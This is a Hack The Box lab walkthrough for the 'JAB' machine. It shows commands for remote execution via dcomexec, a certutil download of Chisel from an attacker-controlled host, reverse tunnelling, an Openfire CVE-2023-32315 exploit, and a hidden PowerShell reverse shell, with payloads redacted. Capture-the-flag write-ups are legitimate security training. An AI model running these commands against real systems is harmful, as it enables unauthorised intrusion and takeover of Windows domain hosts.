# Lab JAB - Hack The Box Walkthrough

This document outlines the steps followed to complete the "JAB" lab on Hack The Box, including the commands used with IP addresses replaced by placeholders.

## Initial Reconnaissance

**Kerberos Enumeration:**
A vulnerable Kerberos ticket for `jmontgomery` was identified and exploited to extract critical information without providing the exact command.

Connect to XMPP with credentials

## Exploitation

**Access to `svc_openfire` service:**
Utilized the obtained credentials for the `svc_openfire` service to execute remote commands:

```bash
./dcomexec.py -object MMC20 'jab.htb/svc_openfire:PASSWORD'@'@IP' 'cmd.exe /c powershell -e [EncodedCommand]'
```

user flag

**Chisel Tunneling:**
Downloading to the target machine and executing Chisel to establish a tunnel:

```bash
certutil.exe -urlcache -f http://@IP:8000/chisel.exe chisel.exe
./chisel server -p 9000 --reverse
./chisel.exe client @IP:9000 R:9090:127.0.0.1:9090
```
**Privilege Escalation on OpenFire**
Exploiting CVE-2023-32315
Using an exploit script without providing the exact details:

```bash
./CVE-2023-32315.py -t http://127.0.0.1:9090
--> Connect with a user previously created with admin rights
--> Add the .jar
---> go Management tool command, code 123
```
Executing a PowerShell reverse shell command:

```bash
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "[EncodedCommand]"
```

YOU GOT NT SYSTEM

